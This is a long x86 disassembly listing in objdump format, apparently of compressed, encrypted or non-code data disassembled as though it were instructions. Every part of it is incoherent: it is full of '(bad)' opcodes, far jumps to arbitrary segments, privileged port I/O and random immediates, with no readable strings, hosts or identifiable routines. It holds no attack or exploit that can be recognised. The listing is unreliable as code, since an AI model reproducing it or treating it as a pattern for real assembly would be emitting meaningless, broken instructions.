  426d94:	je     0x426e0e
  426d96:	cdq    
  426d97:	les    esi,FWORD PTR [edi]
  426d99:	outs   dx,DWORD PTR ds:[esi]
  426d9a:	lea    edx,[ebx]
  426d9c:	test   BYTE PTR [ecx-0x74],ah
  426d9f:	ss adc eax,0x5c79ffe3
  426da5:	adc    BYTE PTR [edi],dl
  426da7:	test   al,0xb3
  426da9:	cmp    ecx,DWORD PTR [ecx]
  426dab:	sub    ebx,0xf97eb21e
  426db1:	jo     0x426d6f
  426db3:	daa    
  426db4:	stos   DWORD PTR es:[edi],eax
  426db5:	test   BYTE PTR [ebx+0x1b9b9556],bl
  426dbb:	cmc    
  426dbc:	xchg   BYTE PTR [ebp+eiz*1-0x665df64f],dh
  426dc3:	rcl    BYTE PTR [ebp-0x2],1
  426dc6:	push   ss
  426dc7:	cmp    BYTE PTR [edi],0xd0
  426dca:	(bad)  
  426dcb:	aaa    
  426dcc:	sub    eax,0xc42e860
  426dd1:	(bad)  
  426dd2:	mov    ebp,0xc87d5190
  426dd7:	inc    esp
  426dd8:	std    
  426dd9:	adc    DWORD PTR [edx-0x97115fa],eax
  426ddf:	addr16 pop edx
  426de1:	mov    ds:0x5c2ce1ba,eax
  426de6:	sub    al,0x22
  426de8:	addr16 dec edi
  426dea:	and    DWORD PTR [edi+0x4d],ebp
  426ded:	sbb    al,0xef
  426def:	js     0x426d82
  426df1:	je     0x426df9
  426df3:	pop    ds
  426df4:	pop    eax
  426df5:	ja     0x426e49
  426df7:	xchg   BYTE PTR [eax+edi*1],ch
  426dfa:	std    
  426dfb:	mov    eax,0x365edf51
  426e00:	dec    edi
  426e01:	jp     0x426e34
  426e03:	xor    BYTE PTR [ebp-0x5f69181a],bh
  426e09:	and    ch,BYTE PTR [ecx+edx*1]
  426e0c:	pop    ebx
  426e0d:	push   edi
	...
  426e1a:	mov    dh,0xe4
  426e1c:	xlat   BYTE PTR ds:[ebx]
  426e1d:	push   esp
  426e1e:	xlat   BYTE PTR ds:[ebx]
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	cmp    ch,bl
  426e28:	(bad)  
  426e29:	jns    0x426e6f
  426e2b:	in     al,0x1
  426e2d:	add    ah,bh
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [ecx+0x111e339f],cl
  426e37:	dec    ebp
  426e38:	sbb    eax,0xdfef6bd2
  426e3d:	cmc    
  426e3e:	jge    0x426eb7
  426e40:	in     al,dx
  426e41:	inc    edx
  426e42:	sub    ch,BYTE PTR [ebx+0x7d]
  426e45:	pop    edi
  426e46:	mul    DWORD PTR es:[eax+0x78]
  426e4a:	jmp    0x426e7d
  426e4c:	jnp    0x426dfe
  426e4e:	pop    esi
  426e4f:	pop    es
  426e50:	rcl    DWORD PTR [edx-0x47],0x57
  426e54:	stc    
  426e55:	jno    0x426e95
  426e57:	popf   
  426e58:	sahf   
  426e59:	xchg   DWORD PTR [edx+0x65c8758c],ebp
  426e5f:	jnp    0x426eba
  426e61:	pop    eax
  426e62:	retf   0x87c1
  426e65:	cdq    
  426e66:	pop    eax
  426e67:	adc    DWORD PTR [ecx+0x6d],ebp
  426e6a:	jb     0x426ede
  426e6c:	fist   WORD PTR [edx+0x4eb5d1aa]
  426e72:	sbb    BYTE PTR [ecx],cl
  426e74:	arpl   WORD PTR [ebx+0x360a08b7],di
  426e7a:	fcom   QWORD PTR [esi-0x81a029b]
  426e80:	into   
  426e81:	adc    edx,DWORD PTR ds:0x526ec488
  426e87:	jmp    0x63ba86c3
  426e8c:	mov    al,0x69
  426e8e:	shr    BYTE PTR [ebp-0x139bdf02],1
  426e94:	test   al,0xcd
  426e96:	push   cs
  426e97:	das    
  426e98:	icebp  
  426e99:	in     al,dx
  426e9a:	daa    
  426e9b:	pop    es
  426e9c:	inc    ebx
  426e9d:	xlat   BYTE PTR ds:[ebx]
  426e9e:	sub    edx,DWORD PTR [ecx]
  426ea0:	mov    ebx,0x6efb2bb1
  426ea5:	sar    ah,cl
  426ea7:	mov    esi,DWORD PTR ds:[edx+ebx*4+0x578f7b4b]
  426eaf:	fdivr  QWORD PTR [ecx-0x2b495c6c]
  426eb5:	addr16 pusha 
  426eb7:	mov    edx,0xef398bbc
  426ebc:	test   al,0x6d
  426ebf:	sub    ebp,DWORD PTR [eax+eax*8-0x1d]
  426ec3:	mov    esi,0xd99684cc
  426ec8:	push   edx
  426ec9:	mov    gs,WORD PTR [eax-0x6e]
  426ecc:	in     al,dx
  426ecd:	ficomp WORD PTR [edx-0xb]
  426ed0:	mul    BYTE PTR [ebx-0x13]
  426ed3:	adc    ah,BYTE PTR [edi+0x65]
  426ed6:	dec    ecx
  426ed7:	cmp    eax,0xab00e016
  426edc:	fld    QWORD PTR [ecx]
  426ede:	pop    edx
  426edf:	daa    
  426ee0:	repz in eax,dx
  426ee2:	dec    ebp
  426ee3:	dec    edi
  426ee4:	dec    eax
  426ee5:	retf   
  426ee6:	pop    eax
  426ee7:	out    dx,al
  426ee8:	inc    eax
  426ee9:	xlat   BYTE PTR ds:[ebx]
  426eea:	hlt    
  426eeb:	(bad)  
  426eec:	jne    0x426efa
  426eee:	add    ebp,DWORD PTR [eax]
  426ef0:	sbb    al,0xa4
  426ef2:	sar    dh,1
  426ef4:	push   edi
  426ef5:	cwde   
  426ef6:	out    0x72,al
  426ef8:	xlat   BYTE PTR ds:[ebx]
  426efa:	aad    0x90
  426efc:	inc    ecx
  426efd:	xchg   edi,eax
  426efe:	cs in  eax,0xce
  426f01:	or     eax,0x4220ece4
  426f06:	push   es
  426f07:	mov    cl,0xb0
  426f09:	out    dx,eax
  426f0a:	mov    ecx,0x9d29da76
  426f0f:	pop    ebp
  426f10:	jle    0x426f1a
  426f12:	push   es
  426f13:	hlt    
  426f14:	cmp    eax,DWORD PTR [eax-0x15d7413c]
  426f1a:	xchg   edi,eax
  426f1b:	stos   BYTE PTR es:[edi],al
  426f1c:	mov    esp,0x1ec44f6c
  426f21:	test   al,0x12
  426f23:	lahf   
  426f24:	std    
  426f25:	mov    ah,0xc9
  426f27:	ds dec ecx
  426f29:	mov    dl,0x31
  426f2b:	mov    esi,0xb5a3284e
  426f30:	fisubr WORD PTR [edi+0x1e3268f8]
  426f36:	xor    bh,BYTE PTR [esi-0x2b6df079]
  426f3c:	xchg   esi,eax
  426f3d:	fsub   QWORD PTR [ebx+0x3e]
  426f40:	sbb    eax,0x3d1d7807
  426f45:	dec    ecx
  426f46:	sbb    ecx,DWORD PTR [eax-0x4d]
  426f49:	mov    eax,0xc7c7597d
  426f4e:	sahf   
  426f4f:	xchg   esi,eax
  426f50:	pop    eax
  426f51:	and    ebx,DWORD PTR [edi+0x15]
  426f54:	sahf   
  426f55:	push   0xffffffe1
  426f57:	or     ebx,edi
  426f59:	push   es
  426f5a:	mov    cl,0x9e
  426f5c:	cmp    cl,BYTE PTR [edi]
  426f5e:	adc    ebp,DWORD PTR [ebp-0x9]
  426f61:	push   ebx
  426f62:	lods   eax,DWORD PTR ds:[esi]
  426f63:	add    al,0xd9
  426f65:	push   esp
  426f66:	cmc    
  426f67:	arpl   WORD PTR [ebp+0x12],sp
  426f6a:	dec    edx
  426f6b:	push   ss
  426f6c:	add    edx,ebp
  426f6e:	xor    al,0x6d
  426f70:	ds xchg esi,eax
  426f72:	repnz out dx,al
  426f74:	es pop ecx
  426f76:	icebp  
  426f77:	dec    eax
  426f78:	xchg   esi,eax
  426f79:	push   esp
  426f7a:	jg     0x426f34
  426f7c:	push   ebp
  426f7d:	into   
  426f7e:	enter  0xbbfd,0x50
  426f82:	jbe    0x426f0a
  426f84:	adc    dl,ah
  426f86:	inc    ebp
  426f87:	loopne 0x426f2f
  426f89:	clc    
  426f8a:	push   ds
  426f8b:	ja     0x426f8f
  426f8d:	xchg   edx,eax
  426f8e:	out    dx,al
  426f8f:	std    
  426f90:	jl     0x426fd9
  426f92:	rol    cl,0xd5
  426f95:	jnp    0x426fca
  426f97:	push   0x2a
  426f99:	and    ecx,edx
  426f9b:	xor    ebp,DWORD PTR ds:0xa2b0ae7a
  426fa1:	punpckhbw mm2,QWORD PTR [esi]
  426fa4:	cli    
  426fa5:	and    eax,0x7be0fec
  426faa:	mov    ebp,0x4af43d63
  426faf:	jnp    0x426fc2
  426fb1:	and    DWORD PTR [edi-0x2b],esi
  426fb4:	push   ss
  426fb5:	mov    ebx,0x95dbe01c
  426fba:	inc    esi
  426fbb:	push   0x3d
  426fbd:	ins    BYTE PTR es:[edi],dx
  426fbe:	retf   0x9e22
  426fc1:	cwde   
  426fc2:	mov    bh,0x70
  426fc4:	loope  0x426feb
  426fc6:	jmp    0x426fbe
  426fc8:	aaa    
  426fc9:	int3   
  426fca:	test   ah,ch
  426fcc:	xor    BYTE PTR [ecx-0x3f],ah
  426fcf:	adc    edi,DWORD PTR [edx+0x42d04a4]
  426fd5:	jae    0x426fbb
  426fd7:	push   0xffffff92
  426fd9:	fmulp  st(0),st
  426fdb:	lods   al,BYTE PTR ds:[esi]
  426fdc:	ja     0x427038
  426fde:	ja     0x426fdf
  426fe0:	jecxz  0x42705d
  426fe2:	stos   DWORD PTR es:[edi],eax
  426fe3:	nop
  426fe4:	(bad)  
  426fe6:	push   0xffffff8c
  426fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fe9:	push   ebx
  426fea:	rol    BYTE PTR [ebx-0x13],cl
  426fed:	push   eax
  426fee:	dec    eax
  426fef:	adc    BYTE PTR [eax+0x36],bl
  426ff2:	cwde   
  426ff3:	sbb    eax,0x4b83be4f
  426ff8:	mov    esi,0x1a14e36d
  426ffd:	xchg   ebp,eax
  426ffe:	(bad)  
  426fff:	imul   ebp,DWORD PTR [ebp+0x5a42245a],0x9755e4a7
  427009:	xchg   esp,eax
  42700a:	sbb    BYTE PTR [edi],0x8d
  42700d:	inc    edi
  42700e:	sub    cl,BYTE PTR ds:0x949c24b1
  427014:	daa    
  427015:	cwde   
  427016:	xor    cl,BYTE PTR [edx+0x2589c4f2]
  42701c:	mov    ebp,0xf0644156
  427022:	jno    0x426fbb
  427024:	xchg   edi,eax
  427025:	ds adc ebp,ebx
  427028:	inc    ebx
  427029:	rol    DWORD PTR [eax-0x4f],1
  42702c:	enter  0x8d,0x0
	...
  427038:	add    BYTE PTR [eax],al
  42703a:	cli    
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx-0x7f5bc2eb]
  427047:	hlt    
  427048:	mov    al,ds:0x1e64014
  42704d:	add    ah,bh
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    bl,cl
  427053:	sbb    bh,bh
  427055:	lahf   
  427056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427057:	pop    eax
  427058:	gs leave 
  42705a:	inc    edx
  42705b:	jl     0x427099
  42705d:	xor    al,0xe9
  42705f:	push   esi
  427060:	in     eax,dx
  427061:	pop    es
  427062:	jbe    0x42704e
  427064:	mov    ds:0x39f0c31d,al
  427069:	test   DWORD PTR [ebx],edx
  42706b:	sahf   
  42706c:	dec    ecx
  42706d:	shl    dh,0x75
  427070:	sbb    dh,ah
  427072:	loop   0x427099
  427074:	sahf   
  427075:	mov    ah,0x16
  427077:	mov    edi,0xd00e129e
  42707c:	cmp    eax,0xa5c9dbae
  427081:	xor    BYTE PTR ds:0xa635a17b,ch
  427087:	jne    0x42703e
  427089:	pop    edi
  42708a:	push   0x25c28406
  42708f:	daa    
  427090:	pop    edi
  427091:	in     al,0x1b
  427093:	dec    ebp
  427094:	les    eax,FWORD PTR [ebp+0x29]
  427097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427098:	aam    0xd2
  42709a:	mov    edi,0x4b4e840a
  42709f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270a0:	xchg   esp,eax
  4270a1:	in     eax,0xc9
  4270a3:	sbb    DWORD PTR [ebx],ebp
  4270a5:	loope  0x427082
  4270a7:	imul   esp,DWORD PTR [edi-0x42c31cdb],0xffffff95
  4270ae:	lods   al,BYTE PTR ds:[esi]
  4270af:	hlt    
  4270b0:	repnz sti 
  4270b2:	mov    ds:0xbe2cce5d,al
  4270b7:	rol    DWORD PTR [ebp+0x4c],1
  4270ba:	push   eax
  4270bb:	mov    dl,0xfe
  4270bd:	pop    esi
  4270be:	retf   0x6db3
  4270c1:	jns    0x42705f
  4270c3:	jmp    0x8517:0xf5261cb3
  4270ca:	mov    cl,0xbf
  4270cc:	pop    edi
  4270cd:	pop    ss
  4270ce:	xor    edx,DWORD PTR [edx]
  4270d0:	or     edi,edx
  4270d2:	sar    eax,0xaf
  4270d5:	add    eax,0x92917bb3
  4270da:	xchg   DWORD PTR [edx-0x78],esp
  4270dd:	mov    bl,0x36
  4270df:	pop    ecx
  4270e0:	in     eax,dx
  4270e1:	inc    ebx
  4270e2:	add    ebp,DWORD PTR [esi-0x91f8d12]
  4270e8:	xor    BYTE PTR [edi-0x1f06e1fb],0x3e
  4270ef:	xlat   BYTE PTR ds:[ebx]
  4270f0:	les    esi,FWORD PTR [edx]
  4270f2:	sub    al,BYTE PTR [edx+eax*1]
  4270f5:	cdq    
  4270f6:	cmp    eax,0x83f3cb46
  4270fb:	inc    ebp
  4270fc:	push   ebp
  4270fd:	es int3 
  4270ff:	(bad)  
  427100:	jmp    FWORD PTR [edi]
  427102:	inc    edx
  427103:	cs gs pop ss
  427106:	dec    esp
  427107:	sub    BYTE PTR [eax-0x65],cl
  42710a:	daa    
  42710b:	cwde   
  42710c:	jno    0x4270be
  42710e:	je     0x427122
  427110:	daa    
  427111:	mov    ecx,0xac6fa846
  427116:	adc    BYTE PTR [edi+0x67eaf1aa],bh
  42711c:	jl     0x42710a
  42711e:	and    DWORD PTR [eax+0x71dfece6],esp
  427124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427125:	and    eax,0x14237433
  42712a:	(bad)  
  42712b:	(bad)  
  42712c:	imul   edi,eax,0xffffffea
  42712f:	push   ds
  427130:	js     0x4270e5
  427132:	dec    ecx
  427133:	jmp    0x338b:0x37f7457b
  42713a:	inc    ebx
  42713b:	dec    eax
  42713c:	jo     0x4270fe
  42713e:	xchg   edx,eax
  42713f:	push   ebp
  427140:	pop    ebx
  427141:	repnz (bad) 
  427143:	in     eax,dx
  427144:	push   ecx
  427145:	xor    esp,DWORD PTR [esi+0x705dad9]
  42714b:	push   cs
  42714c:	xor    bh,BYTE PTR [ebx+0x2]
  42714f:	es pop ebx
  427151:	sub    al,0x5f
  427153:	jne    0x42711d
  427155:	mov    ah,0xb8
  427157:	push   0x22
  427159:	inc    esi
  42715a:	out    dx,al
  42715b:	jmp    0x31eec3ac
  427160:	gs aas 
  427162:	mul    bh
  427164:	push   ds
  427165:	fs repnz or dl,cl
  427169:	cwde   
  42716a:	or     al,0x32
  42716c:	sub    eax,0x180ff81f
  427171:	lock inc ecx
  427173:	fdiv   QWORD PTR [ecx+0x750842ee]
  427179:	cmp    DWORD PTR ds:0xb1320cae,edx
  42717f:	js     0x4271a2
  427181:	xchg   edi,eax
  427182:	mov    WORD PTR [edx+0x75],gs
  427185:	sbb    dl,cl
  427187:	or     ch,BYTE PTR [edx-0x1a]
  42718a:	inc    edx
  42718b:	frstor [edx+esi*1-0x29]
  42718f:	cmp    BYTE PTR [eax+0x73],al
  427192:	into   
  427193:	test   BYTE PTR [ebp+0x64],0x4c
  427197:	lds    eax,FWORD PTR [bx]
  42719a:	and    BYTE PTR [edi-0xcaf708f],bh
  4271a0:	sbb    bh,bh
  4271a2:	inc    ebp
  4271a3:	fcom   QWORD PTR ds:0xe891ca5d
  4271a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271aa:	fbstp  TBYTE PTR [esi+0x6d8e0b01]
  4271b0:	rcr    BYTE PTR [ebx+0x31],1
  4271b3:	pop    ebx
  4271b4:	stc    
  4271b5:	xor    edx,esi
  4271b7:	sar    BYTE PTR [esi+eiz*1+0x32],cl
  4271bb:	(bad)  [ebp-0x18e77a93]
  4271c1:	test   eax,esp
  4271c3:	mov    ds,WORD PTR [eax-0x41699d11]
  4271c9:	gs cmp al,0xa4
  4271cc:	and    bl,cl
  4271ce:	adc    esi,DWORD PTR [eax-0x5c]
  4271d1:	mov    bl,0xd8
  4271d3:	les    esi,FWORD PTR [ebp-0x71]
  4271d6:	pop    ds
  4271d7:	and    edi,DWORD PTR [edx+0x33e8d385]
  4271dd:	push   es
  4271de:	inc    esp
  4271df:	cmp    BYTE PTR [eax-0x3424f25a],0xda
  4271e6:	inc    ebp
  4271e7:	lods   eax,DWORD PTR ds:[esi]
  4271e8:	add    eax,0x68f6e03
  4271ed:	es das 
  4271ef:	cmp    eax,0x3dea0f4d
  4271f4:	fadd   QWORD PTR [eax+0x3f8a3103]
  4271fa:	inc    ecx
  4271fb:	push   ds
  4271fc:	pop    ss
  4271fd:	mov    dh,BYTE PTR [edx+0x1bc9e820]
  427203:	pop    esi
  427204:	mov    ds:0xcae66ae7,al
  427209:	js     0xe94749d
  42720f:	je     0x4271f6
  427211:	or     edi,DWORD PTR es:[ebx+esi*1-0x44398362]
  427219:	adc    ah,BYTE PTR [edx]
  42721b:	fdivp  st(1),st
  42721d:	jmp    0x846e:0x3ff2eb4
  427224:	push   0x11
  427226:	pop    edi
  427227:	aam    0x25
  427229:	xchg   BYTE PTR [ebp+0x5c],cl
  42722c:	dec    ebx
  42722d:	data16 out 0xd3,al
  427230:	stos   BYTE PTR es:[edi],al
  427231:	or     DWORD PTR [edx+0x3d],ecx
  427234:	mov    bh,0x4f
  427236:	xor    edi,edx
  427238:	aad    0x25
  42723a:	jl     0x42720b
  42723c:	jmp    0x25f0e1c0
  427241:	(bad)  
  427242:	icebp  
  427243:	pop    ebp
  427244:	pop    eax
  427245:	xor    al,0x9a
  427247:	inc    edx
  427248:	push   0xffffffdc
  42724a:	sub    ebx,DWORD PTR [ebx+0x8f28]
	...
  427258:	add    BYTE PTR [eax],al
  42725a:	iret   
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x51b02077
  427267:	loopne 0x42723b
  427269:	icebp  
  42726a:	cmp    al,0xe8
  42726c:	add    DWORD PTR [eax],eax
  42726e:	cld    
  42726f:	add    DWORD PTR [eax],eax
  427271:	add    dl,al
  427273:	in     al,dx
  427274:	inc    ebx
  427275:	mov    cl,0x2d
  427277:	and    esi,DWORD PTR [esi]
  427279:	outs   dx,DWORD PTR ds:[esi]
  42727a:	jge    0x42729c
  42727c:	dec    ebx
  42727d:	scas   al,BYTE PTR es:[edi]
  42727e:	out    dx,eax
  42727f:	add    BYTE PTR [edi-0x20],bl
  427282:	(bad)  
  427283:	sub    eax,0x1369d7e3
  427288:	pushf  
  427289:	inc    ecx
  42728a:	icebp  
  42728b:	pop    eax
  42728c:	xchg   ebx,eax
  42728d:	in     al,0x57
  42728f:	in     eax,0xb8
  427291:	xchg   ebp,eax
  427292:	loope  0x4272f7
  427294:	ja     0x427237
  427296:	cdq    
  427297:	sub    eax,0xf4eeeea6
  42729c:	(bad)  
  42729e:	retf   
  42729f:	scas   eax,DWORD PTR es:[edi]
  4272a0:	punpcklwd mm4,mm0
  4272a3:	scas   eax,DWORD PTR es:[edi]
  4272a4:	popf   
  4272a5:	fstp   TBYTE PTR [esi-0x46]
  4272a8:	sti    
  4272a9:	aad    0xf
  4272ab:	mov    bl,0xab
  4272ad:	mov    edi,ebx
  4272af:	(bad)  
  4272b0:	or     bh,BYTE PTR [esi-0x15]
  4272b3:	(bad)  
  4272b5:	loop   0x427279
  4272b7:	(bad)  
  4272b8:	pop    ebp
  4272b9:	ja     0x42730d
  4272bb:	lods   eax,DWORD PTR ds:[esi]
  4272bc:	pop    esi
  4272bd:	(bad)  
  4272be:	loope  0x427283
  4272c0:	sar    BYTE PTR [edi+0x1182960f],0xfe
  4272c7:	cmc    
  4272c8:	jecxz  0x427343
  4272ca:	aas    
  4272cb:	and    esp,edi
  4272cd:	mov    esi,0x863fde83
  4272d2:	cmc    
  4272d3:	int3   
  4272d4:	adc    DWORD PTR [ebx],0x4f2f9ac4
  4272da:	popa   
  4272db:	inc    eax
  4272dc:	das    
  4272dd:	hlt    
  4272de:	xor    eax,ecx
  4272e0:	jnp    0x42731b
  4272e2:	xor    edi,DWORD PTR [ebx+esi*4-0x36]
  4272e6:	psubq  mm7,QWORD PTR [ecx+0x2d]
  4272ea:	ror    BYTE PTR [ebp+0x2d9f6dce],1
  4272f0:	jo     0x4272df
  4272f2:	stos   DWORD PTR es:[edi],eax
  4272f3:	in     al,dx
  4272f4:	inc    esi
  4272f5:	js     0x427353
  4272f7:	in     eax,0xa9
  4272f9:	jle    0x42729a
  4272fb:	sbb    eax,0x47da924f
  427300:	cmc    
  427301:	inc    esi
  427302:	adc    edi,DWORD PTR es:[eax+0x40]
  427306:	cs and eax,0x74732e51
  42730c:	or     WORD PTR ss:[ebx-0x1cf54078],sp
  427314:	dec    eax
  427315:	std    
  427316:	sahf   
  427317:	ds push edx
  427319:	pop    edx
  42731a:	dec    ebp
  42731b:	xchg   esp,eax
  42731c:	push   eax
  42731d:	add    ah,dh
  42731f:	lea    ecx,[edi-0x8]
  427322:	pusha  
  427323:	push   ebp
  427324:	arpl   si,sp
  427326:	add    al,bl
  427328:	jns    0x4272c3
  42732a:	pop    ss
  42732b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42732c:	loope  0x42734d
  42732e:	pusha  
  42732f:	mov    edx,0x9e393a31
  427334:	fcomi  st,st(0)
  427336:	adc    dl,BYTE PTR [edi]
  427338:	mov    bh,0x95
  42733a:	out    dx,al
  42733b:	add    al,0x47
  42733d:	stos   BYTE PTR es:[edi],al
  42733e:	ror    DWORD PTR [ebp+0x62],0x90
  427342:	hlt    
  427343:	mov    ss,edi
  427345:	adc    al,0xfb
  427347:	mov    ch,0xcf
  427349:	and    esp,DWORD PTR [esi-0x34]
  42734c:	sahf   
  42734d:	test   eax,0x97f4de7
  427352:	pop    es
  427353:	add    esi,DWORD PTR [esi]
  427355:	stc    
  427356:	xchg   DWORD PTR [ecx+0x52019279],eax
  42735c:	and    eax,0x6a2a0304
  427361:	cmovae esi,DWORD PTR [esi+ebp*2-0x3d]
  427366:	mov    edx,0xd28d2e85
  42736b:	jmp    FWORD PTR [esi+eiz*1]
  42736e:	ja     0x427313
  427370:	xchg   esi,eax
  427371:	ss jl  0x4273c2
  427374:	fdiv   DWORD PTR [esi+0x2f]
  427377:	aaa    
  427378:	push   eax
  427379:	sub    BYTE PTR [eax+0x32],0xe1
  42737d:	(bad)  
  42737e:	lea    edx,[edx-0x526399fd]
  427384:	dec    ecx
  427385:	dec    edi
  427386:	sbb    BYTE PTR [edx+0x44794ced],dl
  42738c:	ss jmp 0x35c65ca2
  427392:	test   DWORD PTR [eax],esp
  427394:	pop    esi
  427395:	pop    esp
  427396:	pop    esp
  427397:	xchg   edi,eax
  427398:	or     ebx,DWORD PTR [ebx-0x25f1cf40]
  42739e:	xchg   esp,eax
  42739f:	imul   esi,DWORD PTR [ecx+0x19],0xca30a205
  4273a6:	sub    edx,DWORD PTR [ebx+0x66d5865]
  4273ac:	in     eax,dx
  4273ad:	fwait
  4273ae:	jnp    0x427413
  4273b0:	pop    esp
  4273b1:	add    ch,dl
  4273b3:	mov    ebx,0x444d71b9
  4273b8:	and    dl,cl
  4273ba:	repnz fiadd DWORD PTR ds:0x4f01c6b8
  4273c1:	das    
  4273c2:	daa    
  4273c3:	pop    ss
  4273c4:	or     ebp,ecx
  4273c6:	mov    fs,WORD PTR [edx+0x6a]
  4273c9:	test   esp,ebx
  4273cb:	iret   
  4273cc:	imul   esp,DWORD PTR [ebx-0x72],0x27c4ffa0
  4273d3:	add    BYTE PTR [ebp+0x12],0xaa
  4273d7:	popf   
  4273d8:	retf   0x9981
  4273db:	mov    DWORD PTR [eax+0x76],edx
  4273de:	hlt    
  4273df:	jg     0x4273eb
  4273e1:	fs out dx,eax
  4273e3:	icebp  
  4273e4:	jg     0x42744e
  4273e6:	xlat   BYTE PTR ds:[ebx]
  4273e7:	cmp    al,0xf2
  4273e9:	lods   al,BYTE PTR ds:[esi]
  4273ea:	pop    ebp
  4273eb:	ret    
  4273ec:	test   dl,dh
  4273ee:	push   ss
  4273ef:	jbe    0x427426
  4273f1:	popa   
  4273f2:	je     0x427376
  4273f4:	jno    0x4273c2
  4273f6:	push   ebp
  4273f7:	inc    edx
  4273f8:	std    
  4273f9:	(bad)  
  4273fb:	gs gs dec ebp
  4273fe:	pop    es
  4273ff:	sbb    eax,DWORD PTR [eax-0x2bd69d34]
  427405:	cld    
  427406:	push   esi
  427407:	add    edx,DWORD PTR [ecx+0x45]
  42740a:	jmp    0x427483
  42740c:	(bad)  
  42740d:	enter  0x6bea,0xfe
  427411:	dec    eax
  427412:	mov    edi,0xde05e605
  427417:	mov    ds,WORD PTR [ecx+esi*2]
  42741a:	fdivr  st,st(4)
  42741c:	icebp  
  42741d:	test   ebp,ebp
  42741f:	jmp    0x427413
  427421:	(bad)  
  427423:	(bad)  
  427425:	imul   eax,DWORD PTR [eax+0xaf192da],0xffffffe5
  42742c:	adc    BYTE PTR ds:0x5151a49,bh
  427432:	mov    bl,0xbb
  427434:	aam    0x4
  427436:	mov    ebx,esp
  427438:	mov    fs,WORD PTR [esi+0x17]
  42743b:	sub    bl,BYTE PTR [edi]
  42743d:	clc    
  42743e:	fdiv   st(4),st
  427440:	xchg   edi,eax
  427441:	int3   
  427442:	lock pop ecx
  427444:	jg     0x427488
  427446:	xor    al,BYTE PTR [ebp+0x312e7c31]
  42744c:	dec    ecx
  42744d:	(bad)  
  42744e:	fadd   QWORD PTR [edx+0x3401a75a]
  427454:	and    ecx,DWORD PTR [edi]
  427456:	xor    eax,0x9a6f634a
  42745b:	addr16 dec esp
  42745d:	dec    ebx
  42745e:	fild   WORD PTR [ebx-0x33]
  427461:	mov    al,0x73
  427463:	cmp    DWORD PTR [ebx+0x6c],0xdd3712a9
  42746a:	xchg   DWORD PTR ds:0xeb6b,esi
	...
  427478:	add    BYTE PTR [eax],al
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	and    DWORD PTR [ecx],ecx
  427488:	cli    
  427489:	jge    0x4274c3
  42748b:	jmp    0x0:0x1fc0001
  427492:	mov    ebp,0x4dd74b3b
  427497:	out    dx,eax
  427498:	enter  0x4b02,0x2f
  42749c:	mov    bh,0xa7
  42749e:	dec    ebp
  42749f:	dec    ecx
  4274a0:	scas   al,BYTE PTR es:[edi]
  4274a1:	hlt    
  4274a2:	push   esi
  4274a3:	in     eax,dx
  4274a4:	pop    ebp
  4274a5:	push   es
  4274a6:	imul   ecx,DWORD PTR [edi+0x22],0xffffffcc
  4274aa:	xchg   DWORD PTR [esi],ebx
  4274ac:	sar    DWORD PTR [ecx+0x3c],0xb9
  4274b0:	inc    esi
  4274b1:	das    
  4274b2:	xchg   ebx,eax
  4274b3:	test   eax,0x2e94a9a7
  4274b8:	jmp    0xd034d471
  4274bd:	int    0xdd
  4274bf:	lock xchg BYTE PTR [ebp+0x42],bl
  4274c3:	popfw  
  4274c5:	ficomp WORD PTR [edx+0x460b2f9d]
  4274cb:	sbb    eax,DWORD PTR [ecx+0x39344cd9]
  4274d1:	dec    BYTE PTR [edi+0x682f953d]
  4274d7:	inc    eax
  4274d8:	imul   eax,eax,0x397e0031
  4274de:	fsub   st,st(4)
  4274e0:	rcr    DWORD PTR [ecx-0x1c],1
  4274e3:	stc    
  4274e4:	loope  0x4274e0
  4274e6:	(bad)  
  4274e7:	out    dx,eax
  4274e8:	scas   al,BYTE PTR es:[edi]
  4274e9:	xchg   ecx,eax
  4274ea:	(bad)  
  4274eb:	cli    
  4274ec:	(bad)  
  4274ed:	jnp    0x427480
  4274ef:	push   0xb89a86ab
  4274f4:	shr    DWORD PTR [esi-0x4f],1
  4274f7:	pop    eax
  4274f8:	dec    edx
  4274f9:	inc    edx
  4274fa:	or     al,0xaf
  4274fc:	dec    esi
  4274fd:	mov    WORD PTR [edx],?
  4274ff:	sub    al,0xe4
  427501:	xchg   edx,eax
  427502:	ja     0x427577
  427504:	sbb    BYTE PTR [edi-0x13],0x30
  427508:	sbb    ebx,ebx
  42750a:	sub    eax,0x4080d9ac
  42750f:	in     al,dx
  427510:	and    bl,BYTE PTR [esi-0x1cc92513]
  427516:	inc    DWORD PTR ds:0xe888b835
  42751c:	pop    esp
  42751d:	inc    edi
  42751e:	popa   
  42751f:	pop    eax
  427520:	mov    cl,BYTE PTR [ebp+0x1d]
  427523:	push   esi
  427524:	cmp    ch,BYTE PTR [edx+0x7b]
  427527:	aad    0x14
  427529:	sub    al,0xf7
  42752b:	mov    ds:0x3fee6490,eax
  427530:	(bad)  
  427532:	repz retf 
  427534:	push   esp
  427535:	and    DWORD PTR [ecx+0x76],esp
  427538:	pop    es
  427539:	xor    BYTE PTR [ebp-0x57],ch
  42753c:	lods   eax,DWORD PTR ds:[esi]
  42753d:	aam    0x20
  42753f:	mov    dl,0xcd
  427541:	dec    edi
  427542:	pop    es
  427543:	jnp    0x427525
  427545:	mov    ah,0xe6
  427547:	(bad)  
  427549:	sub    al,0x54
  42754b:	out    dx,eax
  42754c:	mov    edi,DWORD PTR [ebp-0x7c992daf]
  427552:	test   BYTE PTR [ecx+eiz*8],bl
  427555:	int3   
  427556:	test   BYTE PTR [edi+edi*1+0x54aadc6b],0xd7
